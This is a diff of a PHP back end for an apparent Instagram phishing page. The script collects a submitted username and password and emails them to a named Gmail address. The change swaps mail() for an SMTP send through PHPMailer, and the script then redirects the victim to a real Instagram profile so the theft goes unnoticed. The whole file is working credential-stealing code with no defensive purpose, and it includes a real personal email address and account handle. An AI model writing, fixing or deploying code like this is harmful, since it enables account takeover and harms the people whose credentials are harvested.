@@ -1,27 +1,39 @@
 <?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'path/to/PHPMailer/src/Exception.php';
+require 'path/to/PHPMailer/src/PHPMailer.php';
+require 'path/to/PHPMailer/src/SMTP.php';
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Recolectar los datos del formulario
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['password']);
 
-    // Configuración del correo electrónico
-    $to = "martinhr1303@gmail.com";
-    $subject = "Datos del formulario de Instagram";
-    $message = "Usuario: $username\nContraseña: $password";
-    $headers = "From: no-reply@tusitio.com\r\n";
-    $headers .= "Reply-To: no-reply@tusitio.com\r\n";
-    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    $mail = new PHPMailer(true);
+    try {
+        // Configuración del servidor SMTP
+        $mail->isSMTP();
+        $mail->Host = 'smtp.tuservidor.com'; // Reemplaza con el host SMTP de tu proveedor
+        $mail->SMTPAuth = true;
+        $mail->Username = 'tu_correo@tuservidor.com'; // Tu correo
+        $mail->Password = 'tu_contraseña'; // Tu contraseña
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+        $mail->Port = 587;
 
-    // Enviar el correo electrónico
-    $mail_sent = mail($to, $subject, $message, $headers);
+        // Configuración del correo
+        $mail->setFrom('no-reply@tuservidor.com', 'No Reply');
+        $mail->addAddress('martinhr1303@gmail.com');
 
-    // Redirigir después de enviar el correo
-    if ($mail_sent) {
-        // Cambia la URL a la que deseas redirigir
-        header("Location: https://www.instagram.com/m.hernandezz3/"); // Reemplaza con tu URL
-        exit(); // Asegúrate de llamar a exit después de header para detener la ejecución del script
-    } else {
-        echo "Error al enviar el correo.";
+        $mail->isHTML(false);
+        $mail->Subject = 'Datos del formulario de Instagram';
+        $mail->Body    = "Usuario: $username\nContraseña: $password";
+
+        $mail->send();
+        header("Location: https://www.instagram.com/m.hernandezz3/");
+        exit();
+    } catch (Exception $e) {
+        echo "Error al enviar el correo: {$mail->ErrorInfo}";
     }
 } else {
     echo "Método de solicitud no válido.";
